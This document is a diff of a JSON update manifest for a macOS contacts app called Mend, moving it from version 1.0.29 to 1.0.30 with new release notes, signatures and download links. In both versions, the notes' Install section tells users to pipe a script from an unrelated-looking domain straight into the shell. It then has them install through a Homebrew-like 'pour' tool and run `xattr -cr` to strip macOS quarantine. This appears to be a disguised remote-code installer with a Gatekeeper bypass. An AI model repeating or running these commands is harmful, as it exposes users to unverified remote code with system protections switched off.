@@ -1,14 +1,14 @@
 {
-  "version": "1.0.29",
-  "notes": "## Mend 1.0.29 — 09 Nov 2026\n\n- **Saving to iCloud no longer fails with \"invalid args book\".** The list of contact sources is rebuilt now and then, and a rebuilt iCloud source that wasn't loaded again had lost which address book to save into. Merging, fixing or copying into it then failed. Mend now remembers each account's address book, and looks it up again if needed.\n- **Merge all no longer stops every 100 people.** Every merge is worked out first; then they're saved 100 at a time. A batch that fails is retried once and then set aside, and the next batch still runs. The summary says how many were merged and how many couldn't be saved and why, and Resume tries those again.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
-  "pub_date": "2026-11-09T02:34:44Z",
+  "version": "1.0.30",
+  "notes": "## Mend 1.0.30 — 11 Nov 2026\n\n- **\"Rebuild Open With\" and the Mac quick fixes work on current macOS.** They ran `lsregister -kill`, which macOS has removed (\"The -kill option has been removed because it was dangerous and no longer useful\"), so the step failed. Mend now rebuilds the list without it.\n- **Apple Configurator in Helpers is a button, not a command.** Instead of showing `open 'https://apps.apple.com/…'`, it says \"Free on the Mac App Store\" with **Get it**, which opens the App Store page directly, with no Terminal window.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
+  "pub_date": "2026-11-11T13:30:47Z",
   "platforms": {
     "darwin-aarch64": {
-      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDFaZXpXKzNqN3ZyZW1YVEhEa01GQTVHV1JSVURyZ1U3UTdWd0U2U2h4RHB6VXZmcGgvN1g0c2F5ZzdVVFdvRlFVb1hLaGsvSUVVSHNlUUhTVE4rTEFzPQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0MTkxNjM5CWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjI5Cm02dG5GRncyY0p3N2NKbWNFZlNoNHY0SUVweUJsdVp0SUliK0tMMkNMWms3Q2s3bThtZ29nYnZaRkZEU0NyZHVpb2IyYjJZZGNXK3dGUW5MWEwzSEJnPT0K",
-      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.29/Mend_aarch64.app.tar.gz"
+      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDh6eWw1TWV6UG4zMlp3cSt0MnE5VzY2Z0JDNVhESitKVVQvM2tzOXdGUHRnSDJJM05LTXBsTzRUY00xM3dlMGVJZW02N2hhdVlRRDN6OXJBZlNwK2drPQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0NDAzNzk0CWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjMwCmpVVS9QejNlU1RTdi9IWG50VUU5QnNSZ2ZiYk1qWjUwZE5YMHl6amhNeExPSVdlOHE1R1BvaDFHblFrNkkxbDZpT0d5WnpRQWFQNTZ4M1gvdUJNMEFnPT0K",
+      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.30/Mend_aarch64.app.tar.gz"
     }
   },
   "downloads": {
-    "mac_arm": "Mend_1.0.29_aarch64.dmg"
+    "mac_arm": "Mend_1.0.30_aarch64.dmg"
   }
 }
